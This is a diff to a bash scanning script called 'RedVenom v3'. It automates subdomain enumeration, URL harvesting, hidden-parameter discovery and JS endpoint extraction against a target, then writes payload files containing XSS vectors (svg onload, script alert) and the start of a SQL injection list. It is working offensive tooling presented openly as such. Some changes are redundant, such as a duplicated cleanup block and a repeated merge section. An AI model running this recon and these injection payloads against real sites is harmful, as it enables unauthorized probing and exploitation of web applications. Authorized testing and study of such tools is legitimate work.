@@ -165,13 +165,20 @@ CURL_CMD=$(command -v curl)
 
 echo -e "${CYAN}[+] Cleaning old recon data...${NC}"
 rm -rf recon_venom/*
+
+# PHASE 2 — Enhanced Recon (RedVenom v3)
+echo -e "${CYAN}[+] Cleaning old recon data...${NC}"
+rm -rf recon_venom/*
 mkdir -p recon_venom/{js,params}
 
+# Tool checks already handled earlier
+[[ -z "$SUBFINDER_CMD" || -z "$HTTPX_CMD" || -z "$GAU_CMD" ]] && echo -e "${RED}[-] Required recon tools missing. Aborting recon.${NC}" && exit 1
+
 echo -e "${CYAN}[*] Running Subfinder...${NC}"
-$SUBFINDER_CMD -d $TARGET -silent -o recon_venom/subdomains.txt & PID1=$!
+$SUBFINDER_CMD -d "$TARGET" -silent -o recon_venom/subdomains.txt & PID1=$!
 
 echo -e "${CYAN}[*] Running gau...${NC}"
-$GAU_CMD --subs --o recon_venom/gau_urls.txt $TARGET & PID2=$!
+$GAU_CMD --subs -o recon_venom/gau_urls.txt "$TARGET" & PID2=$!
 
 wait $PID1
 echo -e "${CYAN}[*] Running httpx...${NC}"
@@ -179,6 +186,17 @@ $HTTPX_CMD -l recon_venom/subdomains.txt -silent -o recon_venom/httpx_live.txt &
 
 wait $PID2
 wait $PID3
+
+# Check outputs
+if [[ ! -s recon_venom/httpx_live.txt ]]; then
+    echo -e "${RED}[-] No live subdomains found by httpx. Exiting.${NC}"
+    exit 1
+fi
+
+if [[ ! -f recon_venom/gau_urls.txt ]]; then
+    echo -e "${YELLOW}[!] gau output not found. Creating empty fallback file.${NC}"
+    touch recon_venom/gau_urls.txt
+fi
 
 echo -e "${CYAN}[*] Running ParamSpider...${NC}"
 RAW_OUTPUT="recon_venom/params/paramspider_raw.txt"
@@ -188,8 +206,7 @@ CLEAN_OUTPUT="recon_venom/params/paramspider_cleaned.txt"
 
 while read -r domain; do
     [[ -z "$domain" ]] && continue
-    $PARAMSPIDER_CMD -d "$domain" \
-        --quiet \
+    $PARAMSPIDER_CMD -d "$domain" --quiet \
         --exclude woff,ttf,svg,png,jpg,jpeg,gif,css,js,ico,bmp,webp \
         2>/dev/null >> "$RAW_OUTPUT"
 done < recon_venom/httpx_live.txt
@@ -197,11 +214,9 @@ done < recon_venom/httpx_live.txt
 grep -Eo 'https?://[^ ]+\?[^ ]+' "$RAW_OUTPUT" | sort -u > "$CLEAN_OUTPUT"
 echo -e "${GREEN}[✔] ParamSpider output saved to:${NC} $CLEAN_OUTPUT"
 
-# Hidden Parameter Discovery via Arjun
 echo -e "${CYAN}[*] Running Arjun for hidden parameter discovery...${NC}"
 $ARJUN_CMD -i recon_venom/httpx_live.txt -oT recon_venom/params/arjun_params.txt -t 20 2>/dev/null
 
-# JavaScript link extraction (filtered by target domain)
 echo -e "${CYAN}[*] Finding JS files from gau output...${NC}"
 grep -Ei '\.js($|\?)' recon_venom/gau_urls.txt | grep "$TARGET" | sort -u > recon_venom/js/js_files.txt
 
@@ -211,6 +226,28 @@ while read -r jsurl; do
     $CURL_CMD -sk "$jsurl" | grep -Eo '[a-zA-Z0-9_\/.-]+?\.(php|asp|aspx|jsp|json|cgi)' >> recon_venom/js/endpoints.txt
 done < recon_venom/js/js_files.txt
 sort -u recon_venom/js/endpoints.txt -o recon_venom/js/endpoints.txt
+
+# Merge all sources
+echo -e "${CYAN}[*] Merging URLs for final list...${NC}"
+cat recon_venom/gau_urls.txt \
+    recon_venom/params/paramspider_cleaned.txt \
+    recon_venom/js/endpoints.txt \
+    recon_venom/params/arjun_params.txt 2>/dev/null | sort -u > recon_venom/all_urls.txt
+
+# Optional filter
+read -p "[?] Do you want full filtered output (only dynamic pages with params)? (y/n): " FILTER_OPTION
+if [[ "$FILTER_OPTION" == "y" ]]; then
+    echo -e "${CYAN}[*] Filtering for dynamic URLs only (.php, .asp, .jsp, .cgi)...${NC}"
+    grep '?' recon_venom/all_urls.txt | grep -Ei '\.php|\.asp|\.aspx|\.jsp|\.cgi' \
+      | grep -vE '\.(js|css|png|jpg|jpeg|gif|svg|woff|ttf)' \
+      | sort -u > recon_venom/all_cleaned_urls.txt
+else
+    echo -e "${CYAN}[*] Using all parameterized URLs without filtering...${NC}"
+    grep '?' recon_venom/all_urls.txt | sort -u > recon_venom/all_cleaned_urls.txt
+fi
+
+echo -e "${GREEN}[✔] Recon phase complete. Output in:${NC} recon_venom/all_cleaned_urls.txt"
+
 
 # Merge Everything
 echo -e "${CYAN}[*] Merging URLs for final list...${NC}"
@@ -282,6 +319,8 @@ echo -e "${CYAN}[*] Preparing payload files and confirmed folder...${NC}"
 mkdir -p payloads recon_venom/confirmed
 
 # Payload sets
+mkdir -p payloads
+
 cat > payloads/xss.txt << 'EOF'
 "><svg/onload=alert(1)>
 "><script>alert(1)</script>
@@ -292,6 +331,7 @@ cat > payloads/xss.txt << 'EOF'
 "><details/open/ontoggle=alert(1)>
 "><marquee/onstart=alert(1)>
 EOF
+
 
 cat > payloads/sqli.txt << 'EOF'
 ' OR 1=1 --
